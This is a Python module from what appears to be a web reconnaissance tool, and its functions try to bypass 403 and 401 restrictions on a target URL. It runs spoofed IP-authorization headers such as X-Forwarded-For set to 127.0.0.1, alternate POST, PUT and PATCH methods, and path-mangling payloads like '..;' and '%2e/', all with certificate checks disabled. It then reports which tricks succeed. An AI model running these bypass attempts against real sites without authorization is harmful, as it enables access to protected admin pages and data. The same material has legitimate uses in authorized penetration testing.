import requests
import traceback
import socket
from config import PLUS, WARNING, INFO, BYP


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def post(res): req_p = requests.post(res, verify=False, allow_redirects=False, timeout=10); return req_p.status_code, "post"
def put(res): req_pt = requests.put(res, verify=False, allow_redirects=False, timeout=10); return req_pt.status_code, "put"
def patch(res): req_ptch = requests.patch(res, verify=False, allow_redirects=False, timeout=10); return req_ptch.status_code, "patch"
#def options(res): req_o = requests.options(res, verify=False, allow_redirects=False); return req_o.status_code, "options"


def method(res):
	""" 
	Try other method 
	Ex: OPTIONS /admin
	"""
	result_list = []
	for funct in [post, put, patch]:
		try:
			result_list.append(funct(res))
		except:
			pass
	for rs, type_r in result_list:
		if rs not in [403, 401, 404, 406, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500, 501, 502, 307]:
			print("{} Forbidden page {} Bypass with this requests type: {} [{}b]".format(BYP, res, type_r, rs))


def original_url(s, res, page, url):
	# Ex: http://lpage.com/admin header="X-Originating-URL": admin
	header = {
	"X-Originating-URL": page
	}
	req_ou = s.get(res, verify=False, headers=header, allow_redirects=False, timeout=10)
	if req_ou.status_code not in [403, 401, 404, 406, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500, 501, 410, 502, 307]:
		print("{}[{}] {} Forbidden Bypass with: 'X-Originating-URL: {}'".format(BYP, req_ou.status_code, url+page, page))


def IP_authorization(s, res, url, domain, page):
	# Ex: http://lpage.com/admin header="X-Custom-IP-Authorization": 127.0.0.1
	headers_type = [
	"X-Originating-IP", "X-Forwarded", "Forwarded", "Forwarded-For", "Forwarded-For-IP", "X-Forwarder-For", "X-Forwarded-For", "X-Forwarded-For-Original",
	"X-Forwarded-By", "X-Forwarded-Host", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "Client-IP", "Access-Control-Allow-Origin", "Origin",
	"X-Custom-IP-Authorization", "X-Forwarded-For "
	]
	
	try:
		website_ip = socket.gethostbyname(domain)
		ips_type  = [website_ip, "127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "0.0.0.0","::1","0:0:0:0:0:0:0:1"]
	except:
		ips_type  = ["127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "localhost", "0.0.0.0","::1","0:0:0:0:0:0:0:1"]
	for h in headers_type:
		for ip in ips_type:
			headers = {h : ip}
			req_ip = s.get(res, verify=False, headers=headers, allow_redirects=False, timeout=10)
			if req_ip.status_code not in [403, 401, 404, 406, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500, 501, 410, 502, 307]:
				print("{}[{}] {} Forbidden Bypass with: {}".format(BYP, req_ip.status_code, url+page, headers))


def other_bypass(s, url, page, req_url):
	"""
	other_bypass: all other known bypass
	"""
	payl = [page+"/.", "/"+page+"/", "./"+page+"/./", "%2e/"+page, page+"/.;/", ".;/"+page, page+"..;", page+"/;/", page+"..%3B",
	page+"/%3B", page+".%3B/", page+"~"] #http://exemple.com/+page+bypass

	len_req_url = len(req_url.content)
	ranges = range(len_req_url - 50, len_req_url + 50) if len_req_url < 100000 else range(len_req_url - 1000, len_req_url + 1000)
	for p in payl:
		url_b = url + p
		req_payload = s.get(url_b, verify=False, allow_redirects=False, timeout=10)
		#print(req_payload.status_code) #DEBUG
		#print("{}:{}".format(len(req_payload.content), len(req_url.content))) #DEBUG
		if req_payload.status_code not in [403, 401, 404, 406, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500, 501, 410, 502, 307] and len(req_payload.content) not in ranges:
			print("{}[{}] Forbidden Bypass with : {} [{}b]".format(BYP, req_payload.status_code, url_b, len(req_payload.content)))

#@timeit #Debug
def bypass_forbidden(res, s):
	"""
	Bypass_forbidden: function for try to bypass code response 403/forbidden
	"""
	res_page = res.split("/")[3:]
	url_split = res.split("/")[:3]
	url = "/".join(url_split) + "/"
	page = "/".join(res_page) if len(res_page) > 1 else "".join(res_page)
	domain =  "/".join(res.split("/")[:3]) + "/"
	req_res = s.get(res, verify=False, timeout=10)
	req_url = s.get(url, verify=False, timeout=10)
	if req_url.status_code in [403, 401]:
		original_url(s, res, page, url)
		IP_authorization(s, res, url, domain, page)
		method(res)
		other_bypass(s, url, page, req_url)
	elif len(req_res.content) in range(len(req_url.content) - 50, len(req_url.content) + 50):
		pass
	else:
		original_url(s, res, page, url)
		IP_authorization(s, res, url, domain, page)
		method(res)
		other_bypass(s, url, page, req_url)


"""if __name__ == '__main__':
	res = ""
	bypass_forbidden(res)"""